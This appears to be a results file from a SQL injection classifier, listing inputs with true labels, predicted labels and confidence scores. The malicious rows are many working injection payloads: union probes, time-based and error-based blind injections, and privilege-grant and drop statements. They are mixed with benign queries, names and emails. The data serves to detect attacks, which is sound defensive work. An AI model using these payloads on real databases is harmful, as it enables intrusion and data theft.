text,true_label,predicted_label,confidence_sql_injection
8.76216e+15,0,0,0.0
select avg ( greater ) from weight select sum ( atom ) ,0,0,0.0
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,1,1.0
israel_piggot@joyclub.pe,0,0,0.004468253314358248
select * from double where apartment = 'invented',0,0,0.0
select count ( distinct needed )  from barn,0,0,0.0
netty9,0,0,0.004468253314358248
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",1,1,1.0
"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",1,1,1.0
73034797e,0,0,0.004468253314358248
"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",1,1,1.0
select * from continent fetch first 3 rows only,0,0,0.0
"1   )    )    union all select null,null,null,null,null,null,null,null--",1,1,1.0
"1%"" and 4595  =  4595#",1,1,1.0
select * from down where price not between 10 and 20,0,0,0.0
select count ( height ) from studying,0,0,0.0
select * from suggest fetch first 3 rows only select top 50 percent * from porch,0,0,0.0
select * from east where tightly = 'lady' fetch first 3 rows only,0,0,0.0
"gredos, 114 12?g",0,0,4.7826991058432104e-05
select * from clear where exciting not like '[slept]%',0,0,0.0
1 where 9752  =  9752,1,1,1.0
"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
" select * from station order by bark, won",0,0,0.0
"mirn, el",0,0,0.0
"1""   )    )    as krro where 1050  =  1050 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,1,1.0
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",1,1,1.0
select * from who order by climate,0,0,0.0
select * from naturally where nearby between provide09/01/1996trail and symbol15/31/1996voyage,0,0,0.0
8.366e+15,0,0,0.0
"1'+  (  select 'zirh' where 9054  =  9054 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",1,1,1.0
"c/ pozo seco 37, 6-d",0,0,0.0
delete from wooden,0,0,0.0
"1'   )    )    as kwre where 7775  =  7775 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
lewes,0,0,0.004468253314358248
select avg ( load ) from mountain select sum ( write ) ,0,0,0.0
46881104c,0,0,0.004468253314358248
"1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1,1,1.0
76156835v,0,0,0.004468253314358248
select top 50 percent * from arm,0,0,0.0
"1',  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,1,1.0
"   select magic, replace, shoulder from hurt where fierce  is null",0,0,0.0
end and    (    (   'vcaf' like 'vcaf,1,1,1.0
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",1,1,1.0
1'  )   where 5145  =  5145,1,1,1.0
"1 where 6169  =  6169   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,1,1.0
select improve ( s )  from cave,0,0,0.0
select * from dirt where leg = 'sight',0,0,0.0
grant connect to name; grant resource to name;,1,0,0.2
"  select * from for where silence not in  ( 'rise', 'roar', 'one' )  ",0,0,0.0
"-4068'   )    )     )   union all select 9491,9491,9491--",1,1,1.0
"antelo y mario, 192,",0,0,0.004468253314358248
herminia,0,0,0.004468253314358248
1'  )   where 5680  =  5680 and   (  3020  =  3020  )  *6703--,1,1,1.0
select * from chapter where nothing = 'time',0,0,0.0
"calle perez galdos 193,",0,0,0.0
lewwis.mall@epbx.pg,0,0,0.004468253314358248
select top 50 percent * from supper,0,0,0.0
cabot camaran,0,0,0.004468253314358248
select count ( symbol ) from planned,0,0,0.0
select * from completely where we not like '[carry]%',0,0,0.0
select factory ( s )  from cell union,0,0,0.0
select avg ( long ) from heavy select sum ( bright ) ,0,0,0.0
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28557 )  order by meta_id asc",0,0,0.0
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",1,1,1.0
select * from proud where price = 'luck' limit 3,0,0,0.0
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
gwenda,0,0,0.004468253314358248
nrez muriscot,0,0,0.004468253314358248
"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",1,1,1.0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",1,1,1.0
select * from movie where physical = 'man'  and city = 'leather',0,0,0.0
select straw from valley union select world from snow order by represent,0,0,0.0
8855,0,0,0.004468253314358248
"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""rvub"" like ""rvub",1,1,1.0
"   select trap,chosen,eventually,journey,job     (  (  build join grandmother on satisfied.salt =  studied.eventually )   inner join perfecton orders.coast =  whom.gentleid ) ",0,0,0.0
"1',  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",1,1,1.0
select * from city fetch first 50 percent rows only,0,0,0.0
"  select pet,buried from ride where anyone = 'wonder' union select leaf, interest from bridge",0,0,0.0
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'iuki'  =  'iuki,1,1,1.0
"   select count ( run ) , conversation from open by shoe",0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 173 )  order by meta_id asc",0,0,0.0
50835477a,0,0,0.004468253314358248
"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"1'  )   as noqp where 4042  =  4042 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
thibaut,0,0,0.004468253314358248
48263928s,0,0,0.004468253314358248
select * from stuck where related = 'serious'  and city = 'former',0,0,0.0
"  select tried,accurate,stared from fellow left join orders on lose.happenid =  broke.list order by tribe.husband",0,0,0.0
select cannot from half union select curve from very order by machinery,0,0,0.0
6.98863e+15,0,0,0.0
select top 3 * from just where doll = 'adventure' select * from try,0,0,0.0
"-5062""   )    )     )   union all select 4125,4125--",1,1,1.0
select globe ( s )  from shirt union all,0,0,0.0
"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
sobrino coyoma,0,0,0.004468253314358248
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1,1,1.0
cooperma,0,0,0.004468253314358248
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,1,1.0
calle nicolas funes 116,0,0,0.0
"-8940""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""vnuo"" like ""vnuo",1,1,1.0
3596,0,0,0.004468253314358248
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,1,1.0
select * from tool where    not news = 'related',0,0,0.0
select * from drive where cattle like '%fly%',0,0,0.0
1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,1,1,1.0
4270,0,0,0.004468253314358248
select avg ( direction ) from television select sum ( last ) ,0,0,0.0
select * from father where related between have09/01/1996or and seed15/31/1996chicken,0,0,0.0
9.90463e+15,0,0,0.0
select middle ( s )  from promised select tribe ( s ) ,0,0,0.0
"  select redid as id, let as automobile from seeing",0,0,0.0
"  select ballid as id, table as fallen from frighten",0,0,0.0
select * from back where real = 'major' fetch first 3 rows only,0,0,0.0
712,0,0,0.004468253314358248
"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'skdy'  =  'skdy",1,1,1.0
"  select out as fence, good as [quietly]  from who",0,0,0.0
41100,0,0,0.004468253314358248
select * from negative fetch first 3 rows only,0,0,0.0
"1%""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 13610 )  order by meta_id asc",0,0,0.0
select * from affect,0,0,0.0
steinfeld@multireform.sg,0,0,0.004468253314358248
"-6662""   )    )    union all select 6755--",1,1,1.0
8693,0,0,0.004468253314358248
" select column_name ( s )  from no,former",0,0,0.0
24768,0,0,0.004468253314358248
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,1.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c9a3c611fd' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,0,0.0
"-4905"" union all select 6082,6082--",1,1,1.0
mangot barra,0,0,0.004468253314358248
22373,0,0,0.004468253314358248
select * from planned fetch first 50 percent rows only,0,0,0.0
"de l' aliga 3,",0,0,0.08
select sleep  (  5  )   and    (    (   '%'  =  ',1,1,1.0
"   select grade, reason, automobilefrom no where obtain  is not null",0,0,0.0
62128531b,0,0,0.004468253314358248
bnrinfo,0,0,0.004468253314358248
"-3249'   )    )     )   union all select 6309,6309#",1,1,1.0
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",1,1,1.0
select avg ( layers ) from lady select sum ( writing ) ,0,0,0.0
delmo,0,0,0.004468253314358248
atuesta venturi,0,0,0.004468253314358248
9ar5i04o,0,0,0.004468253314358248
select * from users where id  =  '1' or \<1 or 1  =  1 -- 1',1,1,1.0
"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,1.0
select min ( green )  as eager from crowd,0,0,0.0
7.13661e+15,0,0,0.0
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",1,1,1.0
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",1,1,1.0
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""sajl""  =  ""sajl",1,1,1.0
select avg ( favorite ) from softly,0,0,0.0
select top 50 percent * from badly select * from thee fetch first 50 percent rows onlyselect top 3 * from leave,0,0,0.0
select * from glass  where sat = blanket,0,0,0.0
leuco vilca,0,0,0.004468253314358248
buitrago pontigo,0,0,0.004468253314358248
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1.0
1' where 9602  =  9602,1,1,1.0
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",1,1,1.0
d'amico urrea,0,0,0.0401973015889566
"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
husky_hurlic@ropadegolf.sn,0,0,0.003983800240513096
select * from twenty where wrote between '1996-07-01' and '1996-07-31',0,0,0.0
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  # ujdg",1,1,1.0
select * from universe where clothes = 'catch' limit 3,0,0,0.0
valdehorna,0,0,0.004468253314358248
"insert into stronger  ( coming, still, correctly )  values  ( 'jack', 'worse', 'egg' )  ",0,0,0.0
select * from car where substance between '1996-07-01' and '1996-07-31',0,0,0.0
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',1,1,1.0
zurueta olarte,0,0,0.004468253314358248
-5268'  )   where 5615  =  5615 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,1.0
"-8966""   )    )     )   or 1628  =  2712",1,1,1.0
en546al,0,0,0.004468253314358248
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",1,1,1.0
"-1302""   )    )    as rshr where 2800  =  2800 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
"1""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""agaz""  =  ""agaz",1,1,1.0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
"iif  (  7889  =  5114,1,1/0  )  ",1,1,1.0
"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,1.0
select due ( s ) from outline inner join,0,0,0.0
"  select strong,molecular from coat where coach = 'industrial' union select frighten, moving from usual",0,0,0.0
select * from sat where finest = 'satisfied' fetch first 3 rows only,0,0,0.0
"1""   )    )    as nhus where 3689  =  3689",1,1,1.0
1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",1,1,1.0
marice,0,0,0.004468253314358248
select wp_posts.* from wp_posts where id in  ( 367580 ) ,0,0,0.0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,1,1,1.0
"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",1,1,1.0
"1' where 7190  =  7190 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
"   select track, frog, orderfrom bend where prize  is not null",0,0,0.0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,1.0
alconchel,0,0,0.004468253314358248
if  (  3831  =  9321  )   select 3831 else drop function ybru--,1,1,1.0
